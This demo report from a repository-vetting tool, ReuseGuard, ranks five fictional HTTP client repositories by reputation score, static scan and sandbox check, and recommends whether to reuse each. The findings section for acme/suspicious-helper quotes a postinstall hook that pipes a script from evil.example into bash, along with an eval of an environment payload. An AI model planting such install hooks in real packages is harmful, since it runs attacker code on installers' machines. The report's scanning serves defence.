# ReuseGuard report

> **Demo report** — generated from built-in fixtures. Repository names, scores, and findings are fictional.

**Seed:** [acme/http-kit](https://github.com/acme/http-kit)<br>
**Generated:** 2026-10-30 12:00 UTC<br>
**ReuseGuard:** v0.6.0<br>
**Verdicts:** 2 USE · 1 INSPECT · 2 AVOID

## Summary

| # | Repository | Role | Stars | Match | Scorecard | Static risk | Sandbox | Verdict |
|---:|---|---|---:|---:|---:|---|---|---|
| 1 | [acme/http-kit](https://github.com/acme/http-kit) | seed | 4,200 | — | 7.8/10 | none | — | **USE** |
| 2 | [acme/web-client](https://github.com/acme/web-client) | alternative | 2,800 | 73.6 | 8.1/10 | none | — | **USE** |
| 3 | [acme/legacy-http](https://github.com/acme/legacy-http) | alternative | 950 | 58.0 | n/a | none | — | **INSPECT FIRST** |
| 4 | [acme/suspicious-helper](https://github.com/acme/suspicious-helper) | alternative | 700 | 44.2 | 6.0/10 | high | containment ok | **AVOID** |
| 5 | [acme/abandoned-http](https://github.com/acme/abandoned-http) | alternative | 60 | 51.1 | 0.8/10 | skipped | — | **AVOID** |

**Verdict key** — **USE**: no medium-or-higher static findings and a passing reputation gate. **INSPECT FIRST**: something needs human review. **AVOID**: a high-risk pattern or a failed reputation gate was found.

> A USE verdict is not a guarantee. Read the evidence and the limitations below.

## 1. acme/http-kit — USE

> Demo seed: a small, typed HTTP client toolkit for service-to-service calls.

- **Repository:** [acme/http-kit](https://github.com/acme/http-kit)
- **Role:** seed
- **Stats:** 4,200 stars · 310 forks · Python · MIT
- **Activity:** last push 2026-10-26 · created 2022-06-13
- **Topics:** `http` · `client` · `python` · `requests` · `toolkit`

### Reputation filter — PASSED

OpenSSF Scorecard: **7.8/10** (checked 2026-10-20)
- OpenSSF Scorecard score: 7.8/10.

| Check | Score |
|---|---:|
| Maintained | 10/10 |
| Code-Review | 9/10 |
| Dangerous-Workflow | 10/10 |
| Token-Permissions | 8/10 |
| Vulnerabilities | 10/10 |
| Binary-Artifacts | 10/10 |
| Pinned-Dependencies | 9/10 |

### Static scan — none

`builtin-patterns` scanned 3 files (193 B) with 0 effective finding(s) and 0 suppressed.
No matching risk patterns were found.

### Verdict — USE (confidence: high)

- Static scan covered 3 files with no medium-or-higher findings.
- Reputation gate passed with a Scorecard score of 7.8/10.

**Caveats:**
- Static analysis cannot prove the absence of malicious code.
- Scorecard measures project practice; it is not a code audit.
- Sandbox verification is opt-in and does not execute repository code.

## 2. acme/web-client — USE

> A modern async HTTP client with retries, connection pooling, and typed responses.

- **Repository:** [acme/web-client](https://github.com/acme/web-client)
- **Role:** alternative
- **Similarity:** 73.6/100 (topics 20.0 · language 20.0 · recency 19.8 · popularity 13.8)
- **Stats:** 2,800 stars · 180 forks · Python · Apache-2.0
- **Activity:** last push 2026-10-18 · created 2024-05-13
- **Topics:** `http` · `client` · `rest` · `python`

### Reputation filter — PASSED

OpenSSF Scorecard: **8.1/10** (checked 2026-10-22)
- OpenSSF Scorecard score: 8.1/10.

| Check | Score |
|---|---:|
| Maintained | 10/10 |
| Code-Review | 10/10 |
| Dangerous-Workflow | 10/10 |
| Token-Permissions | 9/10 |
| Vulnerabilities | 10/10 |
| Binary-Artifacts | 10/10 |
| Pinned-Dependencies | 10/10 |

### Static scan — none

`builtin-patterns` scanned 3 files (193 B) with 0 effective finding(s) and 0 suppressed.
No matching risk patterns were found.

### Verdict — USE (confidence: high)

- Static scan covered 3 files with no medium-or-higher findings.
- Reputation gate passed with a Scorecard score of 8.1/10.

**Caveats:**
- Static analysis cannot prove the absence of malicious code.
- Scorecard measures project practice; it is not a code audit.
- Sandbox verification is opt-in and does not execute repository code.

## 3. acme/legacy-http — INSPECT FIRST

> An older synchronous HTTP helper retained for compatibility.

- **Repository:** [acme/legacy-http](https://github.com/acme/legacy-http)
- **Role:** alternative
- **Similarity:** 58.0/100 (topics 24.0 · language 20.0 · recency 2.1 · popularity 11.9)
- **Stats:** 950 stars · 140 forks · Python · BSD-3-Clause
- **Activity:** last push 2024-02-23 · created 2019-09-17
- **Topics:** `http` · `client` · `python`
- **Flags:** archived

### Reputation filter — UNKNOWN

OpenSSF Scorecard: **not available** — repository is not in the OpenSSF Scorecard dataset
- OpenSSF Scorecard has no public record for this repository.
- Maintenance and project-practice signals could not be checked.

### Static scan — none

`builtin-patterns` scanned 3 files (193 B) with 0 effective finding(s) and 0 suppressed.
No matching risk patterns were found.

### Verdict — INSPECT FIRST (confidence: medium)

- Repository is archived and receives no maintenance.
- Static scan covered 3 files with no medium-or-higher findings.

**Caveats:**
- Static analysis cannot prove the absence of malicious code.
- Unmaintained code can accumulate unfixed vulnerabilities.

## 4. acme/suspicious-helper — AVOID

> A tiny HTTP convenience wrapper. Demo fixture with intentionally risky patterns.

- **Repository:** [acme/suspicious-helper](https://github.com/acme/suspicious-helper)
- **Role:** alternative
- **Similarity:** 44.2/100 (topics 13.3 · language 0.0 · recency 19.5 · popularity 11.4)
- **Stats:** 700 stars · 41 forks · JavaScript · MIT
- **Activity:** last push 2026-09-30 · created 2025-06-17
- **Topics:** `http` · `client` · `javascript`

### Reputation filter — PASSED

OpenSSF Scorecard: **6.0/10** (checked 2026-10-18)
- OpenSSF Scorecard score: 6.0/10.

**Warnings:**
- Dangerous-Workflow check scored 0.

| Check | Score |
|---|---:|
| Maintained | 8/10 |
| Code-Review | 5/10 |
| Dangerous-Workflow | 0/10 |
| Token-Permissions | 5/10 |
| Vulnerabilities | 10/10 |
| Binary-Artifacts | 10/10 |
| Pinned-Dependencies | 6/10 |

### Static scan — HIGH risk

`builtin-patterns` scanned 3 files (326 B) with 4 effective finding(s) and 1 suppressed.

| Severity | Rule | Location | Detail |
|---|---|---|---|
| HIGH | `download-pipe-shell` | `package.json:5` | Remote content is executed without inspection or integrity checking. — `"postinstall": "curl -fsSL https://evil.example/install.sh \| bash"` |
| HIGH | `npm-lifecycle` | `package.json:5` | `postinstall` runs automatically during install: curl -fsSL https://evil.example/install.sh \| bash — `curl -fsSL https://evil.example/install.sh \| bash` |
| MEDIUM | `js-child-process` | `index.js:1` | child_process can execute arbitrary commands. — `const cp = require('child_process');` |
| MEDIUM | `js-eval` | `index.js:2` | eval() can turn data into code. — `eval(process.env.PAYLOAD \|\| 'console.log(1)');` |

<details>
<summary>1 finding(s) suppressed as documentation/test context</summary>

| Severity | Rule | Location | Reason |
|---|---|---|---|
| HIGH | `download-pipe-shell` | `README.md:6` | documentation file |

</details>

### Sandbox — containment verified

`python:3.11-slim` · one container run · 1.8s · network `none` · `/src` read-only · 256 MB · 0.5 CPU · 64 PIDs · 20s timeout

3 files (512 B) · 0 symlinks · 1 executable bit · `/src` writable: **no** · network reachable: **no** · `/tmp` writable: yes

> The probe only inspects file metadata and checks the mount and network configuration. It does not execute repository code. A clean result covers one container run and is not evidence that the repository is safe.

### Verdict — AVOID (confidence: medium)

- Static scan found high-risk patterns.
- HIGH: Download piped into an interpreter (package.json:5)
- HIGH: npm install-time lifecycle script (package.json:5)
- MEDIUM: Node child_process import (index.js:1)

**Caveats:**
- Static analysis cannot prove the absence of malicious code.
- Review the flagged files before deciding whether the findings are acceptable.

## 5. acme/abandoned-http — AVOID

> An unmaintained HTTP wrapper with no recent activity.

- **Repository:** [acme/abandoned-http](https://github.com/acme/abandoned-http)
- **Role:** alternative
- **Similarity:** 51.1/100 (topics 24.0 · language 20.0 · recency 0.0 · popularity 7.1)
- **Stats:** 60 stars · 8 forks · Python · license unknown
- **Activity:** last push 2022-09-21 · created 2020-04-04
- **Topics:** `http` · `client` · `python`

### Reputation filter — SKIPPED

OpenSSF Scorecard: **0.8/10** (checked 2024-01-12)
- OpenSSF Scorecard score: 0.8/10.
- Maintained and Vulnerabilities checks both scored 0.
- Score 0.8 is below the 2.0 skip threshold.

| Check | Score |
|---|---:|
| Maintained | 0/10 |
| Vulnerabilities | 0/10 |

### Static scan — skipped

Scan status: **skipped** — Skipped because the reputation filter rejected the repository.

### Verdict — AVOID (confidence: high)

- The reputation filter rejected this repository.
- OpenSSF Scorecard score: 0.8/10.
- Maintained and Vulnerabilities checks both scored 0.
- Score 0.8 is below the 2.0 skip threshold.

**Caveats:**
- Static analysis cannot prove the absence of malicious code.
- The repository was not downloaded or scanned after the reputation rejection.

## Limitations

- ReuseGuard aggregates signals; it does not prove that a repository is safe.
- Static analysis cannot detect every malicious or vulnerable pattern, and it does not execute any repository code.
- OpenSSF Scorecard measures project practice, not the safety of specific code.
- Recall depends on GitHub Search; missing alternatives are not evidence that none exist.
- Vendored dependencies, generated output, and files over the scanner limits are not inspected.
- Results reflect public data at the time of the run; a later commit can behave differently.
- Sandbox verification is opt-in, covers a single container run, and currently checks container containment only; it does not execute repository code.
- When an external scanner is enabled, its coverage depends on the supplied rule set; rules that are absent cannot produce findings.

## Run details

- Elapsed: 3.2s
- Candidates assessed: 5
- Limits: 4 candidates, 150 MB per repository, GitHub token not configured
- Search queries:
  - `topic:http language:Python stars:>=50 fork:false`
  - `http client typed toolkit language:Python stars:>=50 fork:false`
- Warnings:
  - Demo data: all repository names, scores, and findings are fictional.

*Generated by ReuseGuard v0.6.0.*
